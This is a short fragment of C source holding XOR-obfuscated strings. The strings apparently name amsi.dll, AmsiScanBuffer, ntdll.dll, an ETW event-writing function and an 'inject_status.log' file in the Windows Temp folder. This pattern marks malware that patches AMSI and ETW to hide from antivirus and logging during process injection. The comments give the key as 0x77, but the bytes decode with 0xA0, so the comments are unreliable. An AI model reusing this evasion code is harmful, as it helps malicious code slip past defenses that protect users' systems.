...
static const unsigned char xAmsiDll[] = {
    0xC1, 0xCD, 0xD3, 0xC9, 0x8E, 0xC4, 0xCC, 0xCC
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x77 */
static const unsigned char xAmsiFunc[] = {
    0xE1, 0xCD, 0xD3, 0xC9, 0xF3, 0xC3, 0xC1, 0xCE,
    0xE2, 0xD5, 0xC6, 0xC6, 0xC5, 0xD2
};
#define xAmsiFunc_LEN 14

/* "ntdll.dll" XOR 0x77 */
static const unsigned char xNtdll[] = {
    0xCE, 0xD4, 0xC4, 0xCC, 0xCC, 0x8E, 0xC4, 0xCC,
    0xCC
};
#define xNtdll_LEN 9
...
static const unsigned char xEtwFunc[] = {
    0xE5, 0xD4, 0xD7, 0xE5, 0xD6, 0xC5, 0xCE, 0xD4,
    0xF7, 0xD2, 0xC9, 0xD4, 0xC5
};
#define xEtwFunc_LEN 13

/* "C:\Windows\Temp\inject_status.log" XOR 0x77 */
static const unsigned char xCanaryPath[] = {
    0xE3, 0x9A, 0xFC, 0xF7, 0xC9, 0xCE, 0xC4, 0xCF,
    0xD7, 0xD3, 0xFC, 0xF4, 0xC5, 0xCD, 0xD0, 0xFC,
    0xC9, 0xCE, 0xCA, 0xC5, 0xC3, 0xD4, 0xFF, 0xD3,
    0xD4, 0xC1, 0xD4, 0xD5, 0xD3, 0x8E, 0xCC, 0xCF,
    0xC7
};
